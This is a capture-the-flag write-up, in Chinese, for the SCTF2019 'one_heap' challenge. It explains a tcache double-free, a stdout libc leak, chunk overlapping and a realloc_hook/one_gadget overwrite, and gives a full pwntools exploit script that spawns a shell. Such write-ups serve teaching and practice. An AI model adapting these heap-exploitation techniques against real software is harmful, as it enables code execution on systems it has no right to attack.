---
title: one_heap
categories:
- SCTF2019
---

# SCTF2019 one_heap

## 前言

SCTF2019第一题，通过限制free和malloc的次数考验技巧

## 程序逻辑

程序限制malloc的次数为15，free的次数为4次，存在double free，同时iput函数不会读入'\n'及之后的数据，因此输入'\n'即可保证不修改堆数据。

malloc的chunk地址存储在bss上，因此每次只能释放刚malloc的堆块

![new](./1.jpg)

free里可以double free

![free](./2.jpg)

![input](./3.jpg)

## 漏洞利用

首先用double free + 3次malloc将0x90的tcache bins的数量改为0xff，再free一个0x90的块即可让其放入unsorted bin。注意在free之前malloc一个块在它和top_chunk之间，避免unsorted bin与top chunk合并。

这时的效果是有一个unsorted bin和tcache bin重合，分配一个0x20的块，即可通过输入修改tcache的fd，下下次分配可以到这个地址上，这里修改后2字节爆破stdout结构体，分配一次0x90，下次就可以分配到stdout泄露地址。

这时候我们已经用了三次free，最后的一次free要配合chunk overlapping使用。

按照之前的设计，我们有一个chunk是避免unsorted bin合并的，我们分配一个大小为0x40的chunk，然后释放它，从而tcache bin[0x40]有一个堆。这里在其中构造一个fake chunk的prev_size和size，以绕过之后我们修改unsorted bin的检查

在刚才我们分配完0x20的堆块之后，已经出现了0x555555757310的unsorted bin和0x5555557572f0的tcache bins。我们通过Malloc(0x7f)修改掉unsorted bin的size为0x91(原本是0x61)，从而可以再下次分配分配到之前释放的0x40的tcache bin，进而修改其fd为任意地址，可以分配到这个地址上去。(下面0x20和0x90为之前构造绕过检查)

![bins](./4.jpg)

![bins1](./5.jpg)

最后我们覆盖malloc_hook为one_gadget发现打不通，因为gadgets的条件不满足。这里学习到了另一个技巧，即覆写realloc_hook为one_gadget，因为malloc_hook就在realloc_hook的后面，所以同时可以修改malloc_hook为realloc_addr+x，这个x为偏移，具体偏移多少要视情况而定。从而在执行malloc的时候执行malloc_hook->realloc+x->realloc_hook->one_gadget得到shell。

利用原理是realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。

流程为push寄存器，最后全部pop出来跳转至realloc_hook的值。
将realloc_hook设置为选择好的one_gadget，将malloc_hook设置为realloc函数开头某一push寄存器处。push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。这时one_gadget就会可以使用。具体要压低栈多少要根据环境决定，这里我们可以进行小于48字节内或72字节的堆栈调整。

![push](./6.jpg)

![pop](./7.jpg)

## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 1
gadgets = [0x4f2c5,0x4f322,0x10a38c,0xe569f,0xe5858,0xe585f,0xe5863,0x10a398]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def New(p,size,content):
    p.recvuntil('Your choice:')
    p.sendline('1')
    p.recvuntil('Input the size:')
    p.sendline(str(size))
    p.recvuntil('Input the content:')
    p.send(content)

def Delete(p):
    p.recvuntil('Your choice:')
    p.sendline('2')

def exp(p):
    New(p,0x7f,'a\n')#1
    New(p,0x7f,'a\n')#2

    Delete(p)#1
    Delete(p)#2
    New(p,0x30,p64(0)*4+p64(0x90)+'\x20'+'\n')#3 in case unsorted bin be involved by top chunk
    Delete(p)

    New(p,0x7f,'\n')#4

    New(p,0x7f,'\n')#5
    New(p,0x7f,'\n')#6

    Delete(p)#3
    #got unsorted bin
    New(p,0x20,'\x60\x07\xdd\n')#7

    New(p,0x7f,p64(0)*4+p64(0)+p64(0x91)+'\n')#8 make overlapping chunk


    New(p,0x7f,p64(0xfbad1800)+p64(0)*3+'\x00\n')#9

    p.recvn(8)
    libc_base = u64(p.recvn(8)) - (0x7ffff7dd18b0 - 0x7ffff79e4000)
    log.success('libc base => ' + hex(libc_base))
    realloc_hook = libc.symbols['__realloc_hook'] + libc_base
    realloc = libc_base + libc.symbols["realloc"]
    one_gadget = libc_base + 0x10a38c
    #get shell

    New(p, 0x68, p64(0) * 11 + p64(0x41) + p64(realloc_hook))#10
    #overwrite realloc_hook to one_gadget
    New(p,0x38,'\n')#11
    New(p,0x38,p64(one_gadget)+p64(realloc+4)+'\n')#12
    gdb.attach(p)
    #trigger
    New(p,0x20,'xmzyshypnc\n')#13



    p.interactive()

if debug:
    p = process('./one_heap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('47.104.89.129',10001)
    libc = ELF('./libc-2.27.so')

exp(p)
```
